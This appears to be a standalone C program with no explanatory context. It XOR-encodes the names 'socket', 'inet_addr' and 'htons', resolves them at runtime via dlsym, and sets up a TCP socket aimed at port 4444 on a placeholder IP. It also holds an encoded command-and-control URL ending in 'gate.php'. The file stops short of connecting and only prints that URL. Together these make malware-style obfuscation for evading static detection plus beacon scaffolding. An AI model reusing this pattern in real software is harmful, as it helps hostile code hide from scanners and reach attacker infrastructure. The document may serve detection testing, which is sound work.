#include <stdio.h>
#include <string.h>
#include <dlfcn.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

static void dec(char *out, const unsigned char *in, int n) {
    int i;
    for (i = 0; i < n; i++) out[i] = (char)(in[i] ^ 0x5a);
    out[n] = 0;
}

int main(void) {
    unsigned char e_socket[] = { 41, 53, 57, 49, 63, 46 };
    unsigned char e_inet[] = { 51, 52, 63, 46, 5, 59, 62, 62, 40 };
    unsigned char e_htons[] = { 50, 46, 53, 52, 41 };
    unsigned char e_ip[] = { 107, 99, 104, 116, 106, 116, 104, 116, 107 };
    unsigned char e_url[] = { 50, 46, 46, 42, 96, 117, 117, 107, 99, 104, 116, 106, 116, 104, 116, 107, 96, 110, 110, 110, 110, 117, 61, 59, 46, 63, 116, 42, 50, 42 };
    char s_socket[16], s_inet[16], s_htons[16], ip[32], url[96];

    dec(s_socket, e_socket, 6);
    dec(s_inet, e_inet, 9);
    dec(s_htons, e_htons, 5);
    dec(ip, e_ip, 9);
    dec(url, e_url, 30);

    int (*p_socket)(int, int, int) =
        (int (*)(int, int, int))dlsym(RTLD_DEFAULT, s_socket);
    unsigned int (*p_inet)(const char *) =
        (unsigned int (*)(const char *))dlsym(RTLD_DEFAULT, s_inet);
    unsigned short (*p_htons)(unsigned short) =
        (unsigned short (*)(unsigned short))dlsym(RTLD_DEFAULT, s_htons);

    int s = p_socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in a;
    memset(&a, 0, sizeof(a));
    a.sin_family = AF_INET;
    a.sin_port = p_htons(4444);
    a.sin_addr.s_addr = p_inet(ip);
    printf("connecting to %s\n", url);
    (void)s;
    return 0;
}
